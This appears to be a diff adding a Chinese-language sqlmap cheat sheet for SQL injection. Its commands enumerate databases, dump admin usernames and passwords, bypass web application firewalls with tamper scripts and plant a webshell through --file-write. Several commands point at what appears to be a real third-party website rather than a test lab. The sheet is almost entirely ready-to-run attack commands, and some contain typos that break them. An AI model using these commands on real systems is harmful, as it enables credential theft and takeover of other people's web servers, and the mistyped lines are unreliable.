@@ -1,0 +1,66 @@
+asp注入 sqlmap -u "http://www.czzszxxh.com/newsshow.asp?id=768" --tables 跑表
+
+sqlmap.py -u "http://www.czzszxxh.com/newsshow.asp?id=768" --columns -T 跑出来的表段
+
+sqlmap -u "" --dump -T 跑出来的表段 -C “username,password”检查字段内容
+
+
+php注入
+
+sqlmap -u "URL" --current-db
+
+sqlmap -u "url" -D "数据库" --tables
+
+sqlmap -u "URL" -D "数据库" -T "表名" --columns
+
+
+cookie注入绕过 -u "http://www.xxx.cn/newsview.asp?" --cookie "id=1098" --tables --level 2
+
+-u "http://www.xxx.cn/newsview.asp?" --cookie "id=1098" --跑出来的表 --level 2
+
+-u "http://www.xxx.cn/newsview.asp?" --cookie "id=1098" --dump -T admin -C "username,password" --level 2
+
+
+1.sqlmap的get注入
+
+假设目标是 http://www.xxx.com/news.php?id=1&data=2
+
+sqlmap语句
+
+列库
+
+sqlmap.py -u "http://www.xxx.com/news.php?id=1&data=2" --dbs
+
+//假设结果显示库有3个： test1 、test2 、test3
+
+获取库test1的表
+
+sqlmap.py -u "http://www.xxx.com/news.php?id=1&data=2" -D test1 --tables
+
+//假设有表3个：admin，user，news
+
+获取admin表的columns
+
+sqlmap.py -u "http://www.xxx.com/news.php?id=1&data=2" -D test1 -T admin --columns
+
+//假设有字段3个：id，username，password
+
+获取id，username，password字段的内容
+
+sqlmap.py -u "http://www.xxx.com/news.php?id=1&data=2" -D test1 -T admin -C "id,usrename,password"
+
+一切顺利的话 这算是完成了一次注入
+
+2.sqlmap的post注射 post肯定要post内容，这个内容一般是表单神马的。可以配合burpsuite，也可以自己手工填写，当然，sqlmap之所以叫做神器，那是因为它自己完全可以搞定 target还是http://www.xxx.com/news.php post的内容是 username=&password= 可以用sqlmap的随机值，也可以自己随便填下username=admin&password=123 那么sqlmap语句是： 列库 sqlmap.py -u "http://www.xxx.com/news.php?id=1&data=2" -data="username=admin&password=123" --dbs 后续步骤一样
+
+偷懒不想填post内容可以这样 sqlmap.py -u "http://www.xxx.com/news.php?id=1&data=2" --forms sqlmap自动获取表单，问你是否填写神马的，然后填不填都可以
+
+然后用sqlmap虐sqli-labs的话，我记得lessen4和10 要升到level2才可以
+
+然后是sqlmap的绕过脚本，在最后带上参数 ----tamper "space2morehash.py"
+
+302  waf 绕过 url --tamper "charunicodeencode.py" --tables
+
+过狗语句：sqlmap.py -u xxx -v 3 --batck --tamper xx.py
+
+从注入点写入shell：sqlmap.py -u xxx --is-dba(查看是否root权限，True) 在--file-write=(本地马儿路径) --file-dest=（网站服务器路径）
